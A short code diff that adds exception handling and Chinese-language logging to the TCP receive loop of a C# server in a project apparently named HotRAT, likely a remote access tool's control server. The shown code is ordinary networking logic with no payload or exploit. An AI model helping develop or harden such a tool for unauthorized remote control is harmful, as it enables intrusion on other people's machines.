@@ -64,30 +64,49 @@ namespace HotRAT.Server.Models
             {
                 while (TcpClient.Connected && !_cts.IsCancellationRequested)
                 {
-                    var bytesRead = await _stream.ReadAsync(
-                        _receiveBuffer,
-                        0,
-                        _receiveBuffer.Length,
-                        _cts.Token);
+                    int bytesRead = 0;
+                    try
+                    {
+                        bytesRead = await _stream.ReadAsync(
+                            _receiveBuffer,
+                            0,
+                            _receiveBuffer.Length,
+                            _cts.Token);
+                    }
+                    catch (IOException ioEx)
+                    {
+                        LoggerModel.AddToLog($"IO异常: {ioEx.Message}\n{ioEx.StackTrace}", InfoLevel.Error);
+                        break;
+                    }
+                    catch (ObjectDisposedException)
+                    {
+                        LoggerModel.AddToLog("连接已被关闭 (ObjectDisposedException)", InfoLevel.Warning);
+                        break;
+                    }
 
-                    if (bytesRead == 0) break;
+                    if (bytesRead == 0)
+                    {
+                        LoggerModel.AddToLog("远程主机关闭了连接", InfoLevel.Warning);
+                        break;
+                    }
 
                     await ProcessReceivedData(_receiveBuffer, bytesRead);
                 }
             }
             catch (OperationCanceledException)
             {
-
+                LoggerModel.AddToLog("接收任务已取消", InfoLevel.Warning);
             }
             catch (Exception ex)
             {
-                LoggerModel.AddToLog($"消息接收异常: {ex.Message}", InfoLevel.Error);
+                LoggerModel.AddToLog($"消息接收异常: {ex.Message}\n{ex.StackTrace}", InfoLevel.Error);
             }
             finally
             {
                 Dispose();
             }
         }
+
 
         private async Task ProcessReceivedData(byte[] buffer, int bytesRead)
         {
